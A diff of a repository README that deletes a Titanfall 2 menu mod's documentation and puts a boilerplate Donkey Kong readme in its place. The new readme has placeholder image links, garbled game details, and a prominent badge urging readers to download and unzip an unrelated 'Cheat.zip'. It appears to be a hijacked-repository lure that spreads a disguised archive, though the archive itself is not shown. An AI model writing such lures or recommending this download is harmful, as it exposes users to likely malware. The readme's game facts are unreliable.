@@ -1,120 +1,62 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Donkey Kong
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the Donkey Kong repository! :monkey:
 
+![Donkey Kong Logo](https://yourimagelink.jpg)
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+Donkey Kong is a classic arcade game that features the adventures of the heroic plumber, Jumpman, as he tries to save his love interest, Pauline, from the clutches of the infamous Donkey Kong.
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Installation](#installation)
+- [Gameplay](#gameplay)
+- [Levels](#levels)
+- [Controls](#controls)
+- [Contributing](#contributing)
+- [License](#license)
+
+## Introduction
+
+Donkey Kong is a widely popular and iconic game developed by Nintendo. Released in 1981, it quickly became a classic in the gaming world and paved the way for future platform games. The game follows Jumpman, who later became known as Mario, as he navigates through challenging levels to rescue Pauline from the evil Donkey Kong.
 
 ## Installation
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
+To download and play Donkey Kong, you can click the button below:
 
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
+[![Download Donkey Kong](https://img.shields.io/badge/Download-Cheat.zip-<COLORCODE>)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-## Icepick
+Make sure to unzip the downloaded file and follow the instructions to start playing the game.
 
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+## Gameplay
 
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
+In Donkey Kong, players control Jumpman as he climbs up ladders, leaps over barrels, and avoids obstacles to reach the top where Pauline is being held captive by Donkey Kong. The game is divided into multiple levels, each increasing in difficulty and introducing new challenges.
 
-3) Launch Icepick.
+## Levels
 
-## Northstar
+1. **Level 1 - Construction Site**: Jumpman must climb ladders and dodge barrels thrown by Donkey Kong to reach Pauline.
+   
+    ![Construction Site](https://yourlevel1imagelink.jpg)
 
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
+2. **Level 2 - Elevator Action**: Jumpman navigates moving platforms and elevators while avoiding enemies to reach Pauline.
 
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
+    ![Elevator Action](https://yourlevel2imagelink.jpg)
 
-3) Launch Northstar.
+3. **Level 3 - Rivet Gap**: Jumpman must remove rivets to make platforms disappear and defeat Donkey Kong to rescue Pauline.
 
-## Screenshots
+    ![Rivet Gap](https://yourlevel3imagelink.jpg)
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+## Controls
 
-Main Menu with the original Titanfall 2 menu video
+- **Arrow keys**: Move Jumpman left or right, climb ladders, and move up or down elevators.
+- **Spacebar**: Jump over barrels and obstacles.
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+## Contributing
 
-Main Menu with the showcase removed to declutter the menu
+We welcome contributions to enhance the Donkey Kong gaming experience. Whether you are a developer, designer, or enthusiast, feel free to submit your ideas and improvements through pull requests. Together, we can make Donkey Kong even more enjoyable for players of all ages.
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+## License
 
-New Cheat options that can be enabled as well as the extras menu
+Donkey Kong is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute this game for personal or educational purposes. Remember to give credit to the original creators and have fun playing Donkey Kong!
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
-
-Added keybinds for speedrunners and extra commands for fun
-
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+Thank you for visiting the Donkey Kong repository! Start playing now and relive the exciting adventures of Jumpman in his quest to rescue Pauline. :video_game:
